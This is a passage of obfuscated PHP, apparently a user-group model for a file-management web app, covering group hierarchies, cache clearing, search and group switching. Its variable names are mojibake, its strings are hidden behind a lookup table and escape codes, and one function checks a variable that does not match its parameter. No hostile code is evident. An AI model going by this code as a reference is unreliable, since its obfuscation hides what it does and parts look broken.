$›ç¼ª•[$«èÕõÌŞ[1849]]) { return !1; } if ($¢Åƒú‰[$«èÕõÌŞ[441]] != $À˜®´°ë[$«èÕõÌŞ[441]]) { if ($›ç¼ª•[$«èÕõÌŞ[530]] !== $À˜®´°ë[$«èÕõÌŞ[530]] && strpos($›ç¼ª•[$«èÕõÌŞ[530]], $À˜®´°ë[$«èÕõÌŞ[530]] . $À˜®´°ë[$«èÕõÌŞ[1849]] . $«èÕõÌŞ[60]) === 0) { return !1; } $¢Åƒú‰[$«èÕõÌŞ[599]] = $›ç¼ª•[$«èÕõÌŞ[530]] . $¢Åƒú‰[$«èÕõÌŞ[441]] . $«èÕõÌŞ[60]; $this->_changeChildLevel($À˜®´°ë, $›ç¼ª•); } } if (isset($¢Åƒú‰[$«èÕõÌŞ[42]])) { $this->setNamePinyin($Ğû¸»È”, $¢Åƒú‰[$«èÕõÌŞ[42]]); } if (isset($¢Åƒú‰[$«èÕõÌŞ[1935]])) { $this->metaSet($Ğû¸»È”, array($«èÕõÌŞ[1935] => $¢Åƒú‰[$«èÕõÌŞ[1935]], $«èÕõÌŞ[1936] => $¢Åƒú‰[$«èÕõÌŞ[1936]])); unset($¢Åƒú‰[$«èÕõÌŞ[1935]]); unset($¢Åƒú‰[$«èÕõÌŞ[1936]]); } $this->_clearChildrenCache($À˜®´°ë); return $this->where(array($«èÕõÌŞ[1937] => $Ğû¸»È”))->save($¢Åƒú‰); } private function _clearChildrenCache($»¤÷ã¸) { $ö­¦İ¦½ =& $_SERVER[¹Û¹Æ€]; $†À‡À¦û = array($ö­¦İ¦½[599] => array($ö­¦İ¦½[559], $»¤÷ã¸[$ö­¦İ¦½[530]] . $»¤÷ã¸[$ö­¦İ¦½[1849]] . $ö­¦İ¦½[560])); $Õ±ì×ë’ = $this->field($ö­¦İ¦½[1849])->where($†À‡À¦û)->select(); foreach ($Õ±ì×ë’ as $ÃÑ¤Ì†€) { $this->_clearCache($ÃÑ¤Ì†€[$ö­¦İ¦½[1849]]); } } private function _clearCache($úãÑî›) { $Ä¿ãºØ =& $_SERVER[¹Û¹Æ€]; $this->cacheFunctionClear($Ä¿ãºØ[1931], $úãÑî›); $this->cacheFunctionClear($Ä¿ãºØ[1932], $úãÑî›); } private function _changeChildLevel($à™‰ê›¡, $Ë™’¯÷·, $Ò´Ê¯£ù = false) { $ïğ¼À¬Ô =& $_SERVER[¹Û¹Æ€]; $©Û’³³Ò = $à™‰ê›¡[$ïğ¼À¬Ô[530]] . $à™‰ê›¡[$ïğ¼À¬Ô[1849]] . $ïğ¼À¬Ô[60]; $ÎÌÑˆ‰ = $Ë™’¯÷·[$ïğ¼À¬Ô[530]] . $Ë™’¯÷·[$ïğ¼À¬Ô[1849]] . $ïğ¼À¬Ô[60] . $à™‰ê›¡[$ïğ¼À¬Ô[1849]] . $ïğ¼À¬Ô[60]; if ($Ò´Ê¯£ù) { $ÎÌÑˆ‰ = $Ë™’¯÷·[$ïğ¼À¬Ô[530]] . $Ë™’¯÷·[$ïğ¼À¬Ô[1849]] . $ïğ¼À¬Ô[60]; } $“®¢Ü·® = array($ïğ¼À¬Ô[599] => array($ïğ¼À¬Ô[559], $à™‰ê›¡[$ïğ¼À¬Ô[530]] . $à™‰ê›¡[$ïğ¼À¬Ô[1849]] . $ïğ¼À¬Ô[560])); $¿×ìÅ¥í = array($ïğ¼À¬Ô[599] => array($ïğ¼À¬Ô[608], "\x72\145\x70\x6c\141\143\145\50\160\141\162\x65\x6e\164\x4c\x65\166\145\154\54\x27{$©Û’³³Ò}\x27\54\47{$ÎÌÑˆ‰}\47\x29")); $this->_clearChildrenCache($à™‰ê›¡); $this->where($“®¢Ü·®)->data($¿×ìÅ¥í)->save(); } public function setNamePinyin($—§ëö¥™, $İë™Æùñ = false) { $¶Œ›Èı¯ =& $_SERVER[¹Û¹Æ€]; if (!$İë™Æùñ) { $Óıèî÷ = $this->getInfoSimple($—§ëö¥™); $İë™Æùñ = $Óıèî÷[$¶Œ›Èı¯[42]]; } if (!Input::check($İë™Æùñ, $¶Œ›Èı¯[602])) { $this->metaSet($—§ëö¥™, $¶Œ›Èı¯[474], null); $this->metaSet($—§ëö¥™, $¶Œ›Èı¯[473], null); return; } $‚±Š«Æ“ = array($¶Œ›Èı¯[474] => str_replace($¶Œ›Èı¯[63], $¶Œ›Èı¯[22], Pinyin::get($İë™Æùñ)), $¶Œ›Èı¯[473] => Pinyin::get($İë™Æùñ, $¶Œ›Èı¯[603])); $this->metaSet($—§ëö¥™, $‚±Š«Æ“); } protected function groupStatus($âÁõ•´, $õ¾Êã»Ö) { $£øİÙ =& $_SERVER[¹Û¹Æ€]; $ƒ¤šÇ¿é = $this->getInfoSimple($âÁõ•´); if (!$ƒ¤šÇ¿é) { return !1; } if ($õ¾Êã»Ö == $£øİÙ[98]) { $ÍıúÒŞİ = $this->parentLevelArray($ƒ¤šÇ¿é[$£øİÙ[530]]); } else { $¾Š•€«É = array($£øİÙ[599] => array($£øİÙ[559], $ƒ¤šÇ¿é[$£øİÙ[530]] . $ƒ¤šÇ¿é[$£øİÙ[1849]] . $£øİÙ[560])); $ÍıúÒŞİ = $this->where($¾Š•€«É)->field($£øİÙ[1849])->select(); $ÍıúÒŞİ = array_to_keyvalue($ÍıúÒŞİ, $£øİÙ[22], $£øİÙ[1849]); } $ÍıúÒŞİ[] = $ƒ¤šÇ¿é[$£øİÙ[1849]]; $¢¬ÂÊÁı = array(); foreach ($ÍıúÒŞİ as $âÁõ•´) { $¢¬ÂÊÁı[] = array($£øİÙ[1849] => $âÁõ•´, $£øİÙ[104] => $£øİÙ[748], $£øİÙ[383] => $õ¾Êã»Ö); $this->_clearCache($âÁõ•´); } return Model($£øİÙ[1938])->addAll($¢¬ÂÊÁı, array(), !0); } protected function groupRemove($˜ˆÙıŠï, $ºåí¹”÷ = false) { $¾²»ä¥ =& $_SERVER[¹Û¹Æ€]; $íµ°Úª = array($¾²»ä¥[1849] => $˜ˆÙıŠï); $ôÒéŠÚ = $this->where($íµ°Úª)->find(); if (!$ôÒéŠÚ || $ôÒéŠÚ[$¾²»ä¥[441]] == 0) { return !1; } if (!$ºåí¹”÷) { $†®º·˜ = $this->getInfoSimple($ôÒéŠÚ[$¾²»ä¥[441]]); $this->_changeChildLevel($ôÒéŠÚ, $†®º·˜, !0); $this->where(array($¾²»ä¥[441] => $˜ˆÙıŠï))->save(array($¾²»ä¥[441] => $ôÒéŠÚ[$¾²»ä¥[441]])); } Model($¾²»ä¥[1938])->where($íµ°Úª)->delete(); Model($¾²»ä¥[1939])->where($íµ°Úª)->delete(); Model($¾²»ä¥[823])->groupRootRemove($˜ˆÙıŠï); return $this->where($íµ°Úª)->delete(); } protected function groupSort($«–êüêÉ) { $­Ùéö“¡ =& $_SERVER[¹Û¹Æ€]; $æ¤‚Õ¸† = array(); foreach ($«–êüêÉ as $éçşĞØø => $›˜Şôş) { $æ¤‚Õ¸†[] = array($­Ùéö“¡[1849], $›˜Şôş, $­Ùéö“¡[1873], $éçşĞØø + 1); } $this->saveAll($æ¤‚Õ¸†); } public function listData() { $å¨Ğê¶Ê = $this->_makeOrder()->selectPage(50); $this->_listDataApply($å¨Ğê¶Ê[$_SERVER[¹Û¹Æ€][378]]); return $å¨Ğê¶Ê; } private function _makeOrder($òš…Ïñ³ = '') { $ò¼Ü¾ûş =& $_SERVER[¹Û¹Æ€]; $Û¢¹ÄŒª = array($ò¼Ü¾ûş[1849], $ò¼Ü¾ûş[42], $ò¼Ü¾ûş[1838], $ò¼Ü¾ûş[210]); $şœë¤‘ = array($ò¼Ü¾ûş[459] => $ò¼Ü¾ûş[460], $ò¼Ü¾ûş[461] => $ò¼Ü¾ûş[462]); $”–›ÇÖ = Input::get($ò¼Ü¾ûş[466], $ò¼Ü¾ûş[17], $ò¼Ü¾ûş[1853], $Û¢¹ÄŒª); $àœ—ÅöÌ = Input::get($ò¼Ü¾ûş[467], $ò¼Ü¾ûş[17], $ò¼Ü¾ûş[1940], array($ò¼Ü¾ûş[1940], $ò¼Ü¾ûş[461])); $àœ—ÅöÌ = $şœë¤‘[$àœ—ÅöÌ]; $òš…Ïñ³ = $òš…Ïñ³ . "{$”–›ÇÖ}\40{$àœ—ÅöÌ}\x2c\x20\x67\x72\x6f\x75\x70\111\104\x20\x61\x73\x63"; return $this->order($òš…Ïñ³); } public function listChild($üº•õäï) { $Şã¹ââ =& $_SERVER[¹Û¹Æ€]; $ÀôŒÌ = $this->where(array($Şã¹ââ[441] => $üº•õäï))->_makeOrder()->selectPage(200); $this->_listDataApply($ÀôŒÌ[$Şã¹ââ[378]]); return $ÀôŒÌ; } public function listChildIds($’¹Áî¸á) { $‚ªÆÚÕ =& $_SERVER[¹Û¹Æ€]; if (is_string($’üÎùµ)) { $’¹Áî¸á = explode($‚ªÆÚÕ[60], $’¹Áî¸á); } $Ó¶Ï–æ = $this->where(array($‚ªÆÚÕ[1849] => array($‚ªÆÚÕ[17], $’¹Áî¸á)))->field($‚ªÆÚÕ[1941])->select(); if (!$Ó¶Ï–æ) { return !1; } $ØÒ°ã² = array(); foreach ($Ó¶Ï–æ as $Œ¶–êÇ÷) { $ØÒ°ã²[] = "\x73\x65\x6c\145\143\x74\40\x67\162\157\x75\x70\x49\x44\x20\146\x72\x6f\155\x20\x60\147\162\x6f\165\160\140\40\167\x68\x65\x72\145\x20\160\x61\x72\x65\156\x74\114\x65\166\x65\154\x20\x6c\151\153\145\x20\47{$Œ¶–êÇ÷[$‚ªÆÚÕ[530]]}{$Œ¶–êÇ÷[$‚ªÆÚÕ[1849]]}\54\x25\x27"; } $ØÒ°ã² = implode($‚ªÆÚÕ[1942], $ØÒ°ã²); $Ó¶Ï–æ = $this->query($ØÒ°ã²); if (!$Ó¶Ï–æ) { return array(); } $’¹Áî¸á = array_to_keyvalue($Ó¶Ï–æ, $‚ªÆÚÕ[22], $‚ªÆÚÕ[1849]); return array_unique($’¹Áî¸á); } public function listByID($ãÊë) { $âßììƒí =& $_SERVER[¹Û¹Æ€]; if (!$ãÊë) { return array(); } $¶øÊ–¸Ş = array($âßììƒí[1849] => array($âßììƒí[17], $ãÊë)); $ûÏ‚¾æ„ = $this->where($¶øÊ–¸Ş)->select(); $ûÏ‚¾æ„ = array_sort_keep($ûÏ‚¾æ„, $âßììƒí[1849], $ãÊë); $this->_listDataApply($ûÏ‚¾æ„); return $ûÏ‚¾æ„; } public function listSearch($··Ë¬ÚÆ) { $“Öœü³ =& $_SERVER[¹Û¹Æ€]; $³Üãßğµ = $··Ë¬ÚÆ[$“Öœü³[1943]]; $¦ó¹ö›” = isset($··Ë¬ÚÆ[$“Öœü³[1944]]) ? $··Ë¬ÚÆ[$“Öœü³[1944]] : !1; if (!trim($³Üãßğµ)) { return !1; } $³Üãßğµ = str_replace($“Öœü³[1945], $“Öœü³[1946], $³Üãßğµ); $­Ôıéù¹ = array($“Öœü³[1849] => array($“Öœü³[392], "{$³Üãßğµ}\45"), $“Öœü³[42] => array($“Öœü³[392], "\x25{$³Üãßğµ}\45"), $“Öœü³[997] => $“Öœü³[1947]); if ($¦ó¹ö›”) { $¯Ì‡ãğ = $this->getInfoSimple($¦ó¹ö›”); $ªş’¦÷¿ = $¯Ì‡ãğ[$“Öœü³[530]] . $¦ó¹ö›” . $“Öœü³[560]; $­Ôıéù¹ = array($­Ôıéù¹, array($“Öœü³[530] => array($“Öœü³[392], $ªş’¦÷¿))); } $­Ôıéù¹ = $this->parseWhereLike($­Ôıéù¹); $ûßåØ’¯ = $this->_makeOrder()->where($­Ôıéù¹)->selectPage(20); $ûßåØ’¯ = $ûßåØ’¯ ? $ûßåØ’¯ : array($“Öœü³[378] => array(), $“Öœü³[375] => array()); if (!$ûßåØ’¯ || count($ûßåØ’¯[$“Öœü³[378]]) < 5 && Input::check($³Üãßğµ, $“Öœü³[327])) { $ìŒ©‡Š¾ = $this->groupChildrenAll($¦ó¹ö›”); $ùëëÍûœ = $this->_searchFromMeta($“Öœü³[473], $³Üãßğµ, 10, $ìŒ©‡Š¾); $úÛ¹»°— = $this->_searchFromMeta($“Öœü³[474], $³Üãßğµ, 10, $ìŒ©‡Š¾); $¿ ‚¸¸Ä = array_merge($ùëëÍûœ, $úÛ¹»°—, $ûßåØ’¯[$“Öœü³[378]]); $ûßåØ’¯[$“Öœü³[378]] = array_unique_by_key($¿ ‚¸¸Ä, $“Öœü³[1849]); $ûßåØ’¯[$“Öœü³[375]][$“Öœü³[376]] = count($ûßåØ’¯[$“Öœü³[378]]); $ûßåØ’¯[$“Öœü³[375]][$“Öœü³[377]] = ceil($ûßåØ’¯[$“Öœü³[375]][$“Öœü³[376]] / $ûßåØ’¯[$“Öœü³[375]][$“Öœü³[372]]); } $this->_listDataApply($ûßåØ’¯[$“Öœü³[378]]); return $ûßåØ’¯; } protected function groupChildrenAll($¬”ØöÍğ) { $ûıÕµç÷ =& $_SERVER[¹Û¹Æ€]; if (!$¬”ØöÍğ) { return !1; } if (is_string($¬”ØöÍğ)) { $¬”ØöÍğ = array($¬”ØöÍğ); } $êùØ§•Å = $¬”ØöÍğ; foreach ($¬”ØöÍğ as $ÑŠ£œëğ) { $¹ïÇšÉ¯ = $this->getInfoSimple($ÑŠ£œëğ); $ŒŸ‹ûô— = array($ûıÕµç÷[530] => array($ûıÕµç÷[392], $¹ïÇšÉ¯[$ûıÕµç÷[530]] . $ÑŠ£œëğ . $ûıÕµç÷[560])); $¯ÉĞ¢é = $this->field($ûıÕµç÷[1849])->where($ŒŸ‹ûô—)->select(); $êùØ§•Å = array_merge($êùØ§•Å, array_to_keyvalue($¯ÉĞ¢é, $ûıÕµç÷[22], $ûıÕµç÷[1849])); } return array_unique($êùØ§•Å); } private function _searchFromMeta($ÇÈ¯, $á²ıÓ¡Ş, $š«Á¯£ı, $âØ¯¶‚ä) { $ªóëƒ€í =& $_SERVER[¹Û¹Æ€]; $á²ıÓ¡Ş = strtolower($á²ıÓ¡Ş); $ªü‹‚™í = array($ªóëƒ€í[104] => $ÇÈ¯, $ªóëƒ€í[383] => array($ªóëƒ€í[392], "\45{$á²ıÓ¡Ş}\45")); $ªü‹‚™í = $this->parseWhereLike($ªü‹‚™í); if ($âØ¯¶‚ä) { $ªü‹‚™í[$ªóëƒ€í[1849]] = array($ªóëƒ€í[17], $âØ¯¶‚ä); } $ñäÕüá¼ = Model($ªóëƒ€í[1948])->where($ªü‹‚™í)->limit($š«Á¯£ı)->select(); if (!$ñäÕüá¼) { return array(); } $ñäÕüá¼ = array_to_keyvalue($ñäÕüá¼, $ªóëƒ€í[22], $ªóëƒ€í[1849]); $Ñêœ¢Ä = $this->where(array($ªóëƒ€í[1937] => array($ªóëƒ€í[17], $ñäÕüá¼)))->select(); if (!$Ñêœ¢Ä) { return array(); } return $Ñêœ¢Ä; } protected function _listDataApplyItem($Œ±”Õù‰) { $öÜ¼›´à = array($Œ±”Õù‰); $this->_listDataApply($öÜ¼›´à); return $öÜ¼›´à[0]; } protected function _listDataApply(&$ªÒ¤ëõ¹) { $éùÁæóø =& $_SERVER[¹Û¹Æ€]; if (!$ªÒ¤ëõ¹) { return; } $°°»Û•Ò = array_to_keyvalue($ªÒ¤ëõ¹, $éùÁæóø[22], $éùÁæóø[1849]); $this->_listAppendChildren($ªÒ¤ëõ¹); $this->_listAppendChildrenMember($ªÒ¤ëõ¹); $this->_listAppendMeta($ªÒ¤ëõ¹, $°°»Û•Ò); $this->_listAppendParent($ªÒ¤ëõ¹); $this->_listAppendSourceRoot($ªÒ¤ëõ¹, $°°»Û•Ò); } private function _listAppendChildren(&$ö‹ã‡š) { $§áø×ê“ =& $_SERVER[¹Û¹Æ€]; $§¾¹Š¹” = array_to_keyvalue($ö‹ã‡š, $§áø×ê“[22], $§áø×ê“[1849]); $É´–Ş†¯ = array($§áø×ê“[441] => array($§áø×ê“[17], $§¾¹Š¹”)); $·íÕœ€ª = array($§áø×ê“[441], $§áø×ê“[1949] => $§áø×ê“[509]); $š†…Ş¨· = $this->field($·íÕœ€ª)->where($É´–Ş†¯)->group($§áø×ê“[441])->select(); $Ñ¼ïªŒÃ = array_to_keyvalue($š†…Ş¨·, $§áø×ê“[441], $§áø×ê“[509]); foreach ($ö‹ã‡š as &$öıÜ™) { $Â—Ü¡èã = $öıÜ™[$§áø×ê“[1849]]; $öıÜ™[$§áø×ê“[1950]] = isset($Ñ¼ïªŒÃ[$Â—Ü¡èã]) ? intval($Ñ¼ïªŒÃ[$Â—Ü¡èã]) : !1; } unset($öıÜ™); } private function _listAppendChildrenMember(&$º·Œ”–ï) { $¢»àĞ © =& $_SERVER[¹Û¹Æ€]; $†ıø »° = array_to_keyvalue($º·Œ”–ï, $¢»àĞ ©[22], $¢»àĞ ©[1849]); $šìãƒï³ = array($¢»àĞ ©[1849] => array($¢»àĞ ©[17], $†ıø »°)); $™ëÇçöÓ = array($¢»àĞ ©[1849], $¢»àĞ ©[1949] => $¢»àĞ ©[509]); $²®ñÇî÷ = Model($¢»àĞ ©[1939])->field($™ëÇçöÓ)->where($šìãƒï³)->group($¢»àĞ ©[1849])->select(); $öı‰­‘İ = array_to_keyvalue($²®ñÇî÷, $¢»àĞ ©[1849], $¢»àĞ ©[509]); foreach ($º·Œ”–ï as &$íë“É¯Í) { $íÙ×ßşö = $íë“É¯Í[$¢»àĞ ©[1849]]; $íë“É¯Í[$¢»àĞ ©[1951]] = isset($öı‰­‘İ[$íÙ×ßşö]) ? intval($öı‰­‘İ[$íÙ×ßşö]) : !1; } unset($íë“É¯Í); } private function _listAppendMeta(&$‘çŞ¾„é, $ëª’µ) { $€‰ºüÖ =& $_SERVER[¹Û¹Æ€]; $¯à€İ©ğ = array($€‰ºüÖ[1849] => array($€‰ºüÖ[17], $ëª’µ)); $‘äÊ¤“º = Model($€‰ºüÖ[1938])->where($¯à€İ©ğ)->select(); $‘äÊ¤“º = array_to_keyvalue_group($‘äÊ¤“º, $€‰ºüÖ[1849]); foreach ($‘äÊ¤“º as &$·‡Ä”’Ş) { $·‡Ä”’Ş = array_to_keyvalue($·‡Ä”’Ş, $€‰ºüÖ[104], $€‰ºüÖ[383]); } unset($·‡Ä”’Ş); foreach ($‘çŞ¾„é as &$§ »Å„£) { $§ »Å„£[$€‰ºüÖ[475]] = array(); if (isset($‘äÊ¤“º[$§ »Å„£[$€‰ºüÖ[1849]]])) { $§ »Å„£[$€‰ºüÖ[475]] = $‘äÊ¤“º[$§ »Å„£[$€‰ºüÖ[1849]]]; } } unset($§ »Å„£); } protected function parentLevelArray($áÕ¨‹”Ô) { $¡½‡Ô®À =& $_SERVER[¹Û¹Æ€]; $áÕ¨‹”Ô = explode($¡½‡Ô®À[60], trim($áÕ¨‹”Ô, $¡½‡Ô®À[60])); $áÕ¨‹”Ô = array_remove_value($áÕ¨‹”Ô, $¡½‡Ô®À[207]); return $áÕ¨‹”Ô; } protected function parentInGroup($à§ş¯Ñç, $ëÙš£È£) { $‡¶†âÇ‘ =& $_SERVER[¹Û¹Æ€]; $š×öıË‚ = $this->getInfoSimple($à§ş¯Ñç); if (!$š×öıË‚) { return !0; } $ ïâ•Èá = $this->parentLevelArray($š×öıË‚[$‡¶†âÇ‘[530]]); $ ïâ•Èá[] = $à§ş¯Ñç; foreach ($ ïâ•Èá as $à§ş¯Ñç) { if (in_array($à§ş¯Ñç . $‡¶†âÇ‘[22], $ëÙš£È£)) { return !0; } } return !1; } private function _listAppendParent(&$À¨ÎœÒ¨) { $ùÚüíÎÆ =& $_SERVER[¹Û¹Æ€]; $‘ş‘ĞÚì = array(); foreach ($À¨ÎœÒ¨ as &$Œñ­´¹À) { $‘ş‘ĞÚì[$Œñ­´¹À[$ùÚüíÎÆ[1849]]] = $Œñ­´¹À[$ùÚüíÎÆ[42]]; $¡§’¸‚ = $this->parentLevelArray($Œñ­´¹À[$ùÚüíÎÆ[530]]); foreach ($¡§’¸‚ as $û»¾¢›) { if (!isset($‘ş‘ĞÚì[$û»¾¢›])) { $‘ş‘ĞÚì[$û»¾¢›] = 0; } } } unset($Œñ­´¹À); foreach ($‘ş‘ĞÚì as $¥ÚÃÊ => $îÑßß±˜) { if ($îÑßß±˜) { continue; } $ß§ÑƒÇ¹ = $this->getInfoSimple($¥ÚÃÊ); $‘ş‘ĞÚì[$¥ÚÃÊ] = $ß§ÑƒÇ¹[$ùÚüíÎÆ[42]]; } $òí•‡…ş = $GLOBALS[$ùÚüíÎÆ[16]][$ùÚüíÎÆ[99]][$ùÚüíÎÆ[1952]]; if ($GLOBALS[$ùÚüíÎÆ[512]] == $ùÚüíÎÆ[98]) { $òí•‡…ş = !1; } foreach ($À¨ÎœÒ¨ as &$Œñ­´¹À) { $¡§’¸‚ = $this->parentLevelArray($Œñ­´¹À[$ùÚüíÎÆ[530]]); $¶Œğ¤Ô¶ = $ùÚüíÎÆ[22]; foreach ($¡§’¸‚ as $¥ÚÃÊ => $û»¾¢›) { if ($òí•‡…ş && $¥ÚÃÊ == 0) { continue; } $¶Œğ¤Ô¶ .= $‘ş‘ĞÚì[$û»¾¢›] . $ùÚüíÎÆ[18]; } if ($¡§’¸‚) { $¶Œğ¤Ô¶ .= $Œñ­´¹À[$ùÚüíÎÆ[42]]; } $Œñ­´¹À[$ùÚüíÎÆ[535]] = str_replace($ùÚüíÎÆ[538], $ùÚüíÎÆ[18], $¶Œğ¤Ô¶); } unset($Œñ­´¹À); } private function _listAppendSourceRoot(&$¤‡Ó·¾¡, $”ç‡áÇÌ) { $ÃÎ¦¼„¦ =& $_SERVER[¹Û¹Æ€]; $ùãã÷¼Ï = Model($ÃÎ¦¼„¦[823])->listSourceRoot(SourceModel::TYPE_GROUP, $”ç‡áÇÌ); $ùãã÷¼Ï = array_to_keyvalue($ùãã÷¼Ï, $ÃÎ¦¼„¦[514]); $ùãã÷¼Ï = array_remove_key($ùãã÷¼Ï, $ÃÎ¦¼„¦[514]); foreach ($¤‡Ó·¾¡ as &$¶°œğ´) { $¶°œğ´[$ÃÎ¦¼„¦[96]] = $ùãã÷¼Ï[$¶°œğ´[$ÃÎ¦¼„¦[1849]]] ? $ùãã÷¼Ï[$¶°œğ´[$ÃÎ¦¼„¦[1849]]] : array(); } unset($¶°œğ´); } protected function groupMerge($«µ¿ÜŠ) { $«µ¿ÜŠ = array_values(array_unique($«µ¿ÜŠ)); $‰ÛÊÑÂî = array(); for ($Ø‰…ØÒ = 0; $Ø‰…ØÒ < count($«µ¿ÜŠ); $Ø‰…ØÒ++) { $ğ•Ëä·… = !1; for ($Æ¿‰Èã = 0; $Æ¿‰Èã < count($«µ¿ÜŠ); $Æ¿‰Èã++) { if ($Ø‰…ØÒ == $Æ¿‰Èã) { continue; } if ($this->isParentOf($«µ¿ÜŠ[$Æ¿‰Èã], $«µ¿ÜŠ[$Ø‰…ØÒ])) { $ğ•Ëä·… = !0; break; } } if (!$ğ•Ëä·…) { $‰ÛÊÑÂî[] = $«µ¿ÜŠ[$Ø‰…ØÒ]; } } return $‰ÛÊÑÂî; } protected function isParentOf($ÔøÙæª¨, $ÏÅ§å·ñ) { $˜«šÀõí =& $_SERVER[¹Û¹Æ€]; if (!$ÔøÙæª¨ || !$ÏÅ§å·ñ || $ÔøÙæª¨ == $ÏÅ§å·ñ) { return !1; } $ò¬÷í÷Ä = $this->getInfoSimple($ÔøÙæª¨); $Ê‡Ú‰› = $this->getInfoSimple($ÏÅ§å·ñ); $ùÏüÏ¯Š = $ò¬÷í÷Ä[$˜«šÀõí[530]] . $ÔøÙæª¨ . $˜«šÀõí[60]; if (substr($Ê‡Ú‰›[$˜«šÀõí[530]], 0, strlen($ùÏüÏ¯Š)) == $ùÏüÏ¯Š) { return !0; } return !1; } public function groupShowRoot($°ş§ŞåŒ, $é»°ÀëÓ = false) { $ÅİöÈÃ =& $_SERVER[¹Û¹Æ€]; $Õ‘½öØ» = $this->getInfo($°ş§ŞåŒ); if (!$Õ‘½öØ») { return array(); } $®¯æ‘´ = $this->parentLevelArray($Õ‘½öØ»[$ÅİöÈÃ[530]]); $»ÔÊµ = array($°ş§ŞåŒ); if (count($®¯æ‘´) == 0) { return $»ÔÊµ; } if ($é»°ÀëÓ && count($®¯æ‘´) == 1) { return $»ÔÊµ; } if (!$Õ‘½öØ»[$ÅİöÈÃ[475]] || !isset($Õ‘½öØ»[$ÅİöÈÃ[475]][$ÅİöÈÃ[1935]]) || $Õ‘½öØ»[$ÅİöÈÃ[475]][$ÅİöÈÃ[1935]] == $ÅİöÈÃ[1904]) { return $this->groupShowRoot($®¯æ‘´[count($®¯æ‘´) - 1], $é»°ÀëÓ); } if ($Õ‘½öØ»[$ÅİöÈÃ[475]][$ÅİöÈÃ[1935]] == $ÅİöÈÃ[366]) { $Ÿº‚´é = explode($ÅİöÈÃ[60], $Õ‘½öØ»[$ÅİöÈÃ[475]][$ÅİöÈÃ[1936]]); if ($Ÿº‚´é) { $»ÔÊµ = array_merge($»ÔÊµ, $Ÿº‚´é); } } return $»ÔÊµ; } protected function resetParentLevel() { $ØÇùı =& $_SERVER[¹Û¹Æ€]; $¥ÙÚÙÑˆ = $ØÇùı[1849]; $Šã½òÆï = $this->select(); $Šã½òÆï = array_to_keyvalue($Šã½òÆï, $¥ÙÚÙÑˆ); foreach ($Šã½òÆï as $˜ˆ„÷‘‘) { $÷Õâá¶¬ = $˜ˆ„÷‘‘; $ÓòÖòé´ = array(); while ($÷Õâá¶¬[$ØÇùı[441]] != 0) { $ÓòÖòé´[] = $÷Õâá¶¬[$ØÇùı[441]]; $÷Õâá¶¬ = $Šã½òÆï[$÷Õâá¶¬[$ØÇùı[441]]]; } $ÓòÖòé´[] = 0; $ÓòÖòé´ = $ØÇùı[60] . implode($ØÇùı[60], array_reverse($ÓòÖòé´)) . $ØÇùı[60]; $this->setNamePinyin($˜ˆ„÷‘‘[$¥ÙÚÙÑˆ], $˜ˆ„÷‘‘[$ØÇùı[42]]); $this->where(array($¥ÙÚÙÑˆ => $˜ˆ„÷‘‘[$¥ÙÚÙÑˆ]))->save(array($ØÇùı[599] => $ÓòÖòé´)); } return $Šã½òÆï; } public function groupNameAuto($îëáÎ¹Ø, $¦À³âôÃ) { $ß‹ÏşŒü =& $_SERVER[¹Û¹Æ€]; $èŠÙ„Íô = $this->where(array($ß‹ÏşŒü[410] => $îëáÎ¹Ø))->getField($ß‹ÏşŒü[42], !0); if (!$èŠÙ„Íô || !in_array($¦À³âôÃ, $èŠÙ„Íô)) { return $¦À³âôÃ; } for ($òŸÂ‚ = 1; $òŸÂ‚ <= count($èŠÙ„Íô) + 1; $òŸÂ‚++) { $ë¬ÛœÀæ = $¦À³âôÃ . "\50{$òŸÂ‚}\x29"; if (!in_array($ë¬ÛœÀæ, $èŠÙ„Íô)) { return $ë¬ÛœÀæ; } } } public function groupSwitch($ãè‘ÌÆ , $”ú—ıü) { $ßÏØë¨ =& $_SERVER[¹Û¹Æ€]; $Ü¨æ •° = array($ßÏØë¨[1849] => array($ßÏØë¨[17], array($ãè‘ÌÆ , $”ú—ıü))); $ŸêÍº… = $this->where($Ü¨æ •°)->select(); $ŸêÍº… = array_to_keyvalue($ŸêÍº…, $ßÏØë¨[1849]); if (!isset($ŸêÍº…[$ãè‘ÌÆ ]) || !isset($ŸêÍº…[$”ú—ıü]) || $ŸêÍº…[$ãè‘ÌÆ ][$ßÏØë¨[441]] == 0) { return !1; } $Ü¨æ •° = array($ßÏØë¨[1849] => $ãè‘ÌÆ ); $–”½ç‰« = Model($ßÏØë¨[1939])->where($Ü¨æ •°)->select(); if (!$–”½ç‰«) { $–”½ç‰« = array(); } foreach ($–”½ç‰« as $‹óá¬… ) { $èéë€˜ = $‹óá¬… [$ßÏØë¨[1659]]; $Ü¨æ •° = array($ßÏØë¨[1659] => $èéë€˜, $ßÏØë¨[1849] => $”ú—ıü); $ÍÅ’ĞœÎ = Model($ßÏØë¨[1939])->where($Ü¨æ •°)->find(); if (!$ÍÅ’ĞœÎ) { $‡…²÷ô = array($”ú—ıü => $‹óá¬… [$ßÏØë¨[1953]]); Model($ßÏØë¨[544])->userGroupAdd($èéë€˜, $‡…²÷ô); } Model($ßÏØë¨[544])->userGroupRemove($èéë€˜, $ãè‘ÌÆ ); } $Ü¨æ •° = array($ßÏØë¨[420] => 2, $ßÏØë¨[441] => 0, $ßÏØë¨[419] => 1, $ßÏØë¨[514] => array($ßÏØë¨[17], array($ãè‘ÌÆ , $”ú—ıü))); $šè«²®ì = Model($ßÏØë¨[823])->where($Ü¨æ •°)->field($ßÏØë¨[1954])->select(); $šè«²®ì = array_to_keyvalue($šè«²®ì, $ßÏØë¨[514], $ßÏØë¨[411]); $¬ø±ãëˆ = !empty($šè«²®ì[$ãè‘ÌÆ ]) ? $šè«²®ì[$ãè‘ÌÆ ] : !1; if ($¬ø±ãëˆ) { if (!$šè«²®ì[$”ú—ıü]) { $šè«²®ì[$”ú—ıü] = Model($ßÏØë¨[823])->groupRootAdd($”ú—ıü); } $áÅøÀµ = $šè«²®ì[$”ú—ıü]; $Ü¨æ •° = array($ßÏØë¨[441] => $¬ø±ãëˆ); $šè«²®ì = Model($ßÏØë¨[823])->where($Ü¨æ •°)->field($ßÏØë¨[1955])->select(); if (!$šè«²®ì) { $šè«²®ì = array(); } Model($ßÏØë¨[823])->moveClearAuth = !1; foreach ($šè«²®ì as $õÕ…Ó™¢) { $­“‘œÍ  = $õÕ…Ó™¢[$ßÏØë¨[419]] == $ßÏØë¨[98] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($ßÏØë¨[823])->move($õÕ…Ó™¢[$ßÏØë¨[411]], $áÅøÀµ, $­“‘œÍ ); } Model($ßÏØë¨[823])->moveClearAuth = !0; $Ü¨æ •° = 